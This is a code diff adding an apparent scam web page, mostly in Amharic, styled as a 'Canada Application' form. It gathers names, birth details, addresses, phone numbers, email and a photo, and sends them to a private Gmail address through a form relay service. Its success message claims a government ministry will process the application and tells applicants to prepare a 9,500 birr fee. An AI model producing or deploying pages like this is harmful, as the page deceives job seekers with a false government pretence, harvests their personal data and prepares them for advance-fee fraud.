@@ -1,0 +1,168 @@
+
+<!DOCTYPE html>
+<html lang="am">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CA Form - Application</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background: #eef3f8;
+  margin: 0;
+  padding: 15px;
+  color: #222;
+}
+.container {
+  max-width: 600px;
+  margin: auto;
+  background: white;
+  border-radius: 12px;
+  overflow: hidden;
+  box-shadow: 0 2px 12px #0002;
+}
+header {
+  background: #174a82;
+  color: white;
+  text-align: center;
+  padding: 25px 10px;
+}
+header h1 { margin: 0; }
+main { padding: 20px; }
+h2 { text-align: center; color: #174a82; }
+label {
+  display: block;
+  margin-top: 14px;
+  font-weight: bold;
+}
+input, select {
+  width: 100%;
+  box-sizing: border-box;
+  padding: 12px;
+  margin-top: 6px;
+  border: 1px solid #bbb;
+  border-radius: 6px;
+  font-size: 16px;
+}
+button {
+  width: 100%;
+  background: #174a82;
+  color: white;
+  border: 0;
+  padding: 15px;
+  border-radius: 7px;
+  font-size: 18px;
+  margin-top: 22px;
+}
+#success {
+  display: none;
+  padding: 22px;
+  line-height: 1.9;
+  white-space: pre-line;
+}
+#success h2 { color: #24833b; }
+.notice { margin-top: 20px; }
+</style>
+</head>
+<body>
+<div class="container">
+<header>
+<h1>CANADA APPLICATION</h1>
+<p>APPLICATION FORM</p>
+</header>
+
+<main id="formArea">
+<h2>የማመልከቻ ቅጽ</h2>
+
+<form id="applicationForm">
+<label>ሙሉ ስም</label>
+<input name="Full Name" required>
+
+<label>ፆታ</label>
+<select name="Sex" required>
+<option value="">ይምረጡ</option>
+<option>ወንድ</option>
+<option>ሴት</option>
+</select>
+
+<label>የትውልድ ቀን</label>
+<input type="date" name="Date of Birth" required>
+
+<label>የትውልድ ቦታ</label>
+<input name="Place of Birth" required>
+
+<label>ከተማ</label>
+<input name="City" required>
+
+<label>ክልል</label>
+<input name="Region" required>
+
+<label>ክፍለ ከተማ / ወረዳ</label>
+<input name="Subcity or Woreda" required>
+
+<label>ኢሜል</label>
+<input type="email" name="Email" required>
+
+<label>ስልክ ቁጥር</label>
+<input type="tel" name="Phone" required>
+
+<label>ተጨማሪ ስልክ ቁጥር</label>
+<input type="tel" name="Additional Phone">
+
+<label>ፎቶ ያስገቡ</label>
+<input type="file" name="attachment" accept="image/*" required>
+
+<label>
+<input type="checkbox" name="Consent" value="Agreed" required style="width:auto">
+ይህ ቅጽ የግል አገልግሎት እንጂ የመንግስት ድረገጽ አይደለም።
+የማመልከቻ መረጃዬ እንዲላክ እስማማለሁ።
+</label>
+
+<button type="submit">SUBMIT</button>
+</form>
+</main>
+
+<section id="success">
+<h2>ማመልከቻው ተልኳል</h2>
+<p>ማመልከቻው ወደ ስራ እና ክህሎት ሚኒስትር ይላካል
+ማመልከቻውም ተቀባይነት ካገኘ በ 0919496846 ተደውሎ የሚነገራችሁ ይሆናል</p>
+
+<div class="notice">
+<b>ማሳሰቢያ</b>
+<p>ማመልከቻው ተቀባይነት ካገኘ 9,500 ብር የሚከፍሉ ስለሆነ እባክዎትን ካሁኑ ዝግጁ ይሁኑ</p>
+</div>
+<h3 style="text-align:center;color:#174a82">መልካም እድል</h3>
+</section>
+</div>
+
+<script>
+const form = document.getElementById("applicationForm");
+
+form.addEventListener("submit", async function(e) {
+  e.preventDefault();
+
+  const data = new FormData(form);
+  data.append("_subject", "New CA Form Application");
+
+  try {
+    const response = await fetch(
+      "https://formsubmit.co/ajax/Sec6123456@gmail.com",
+      {
+        method: "POST",
+        body: data,
+        headers: { "Accept": "application/json" }
+      }
+    );
+
+    if (!response.ok) throw new Error("Submission failed");
+
+    document.getElementById("formArea").style.display = "none";
+    document.getElementById("success").style.display = "block";
+    window.scrollTo(0, 0);
+  } catch (error) {
+    alert("ማመልከቻው አልተላከም። እባክዎ እንደገና ይሞክሩ።");
+  }
+});
+</script>
+</body>
+</html>
